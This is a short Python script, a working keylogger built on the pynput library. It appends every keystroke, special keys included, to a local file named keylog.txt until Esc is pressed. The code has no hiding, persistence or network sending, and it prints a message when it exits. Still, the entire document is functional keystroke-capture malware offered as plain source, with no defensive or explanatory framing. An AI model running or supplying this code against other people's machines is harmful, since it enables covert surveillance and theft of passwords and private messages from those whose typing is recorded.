from pynput.keyboard import Listener, Key

# Path to save the log file
log_file_path = "keylog.txt"

# Function to handle each keypress
def on_press(key):
    # Stop the listener when the Esc key is pressed
    if key == Key.esc:
        print("Exiting keylogger.")
        return False  # Returning False stops the listener
    
    try:
        # Append the key pressed to the log file
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Special keys like space, enter, etc.
        with open(log_file_path, "a") as log_file:
            log_file.write(f"[{key}]")

# Start listening to keyboard events
with Listener(on_press=on_press) as listener:
    listener.join()
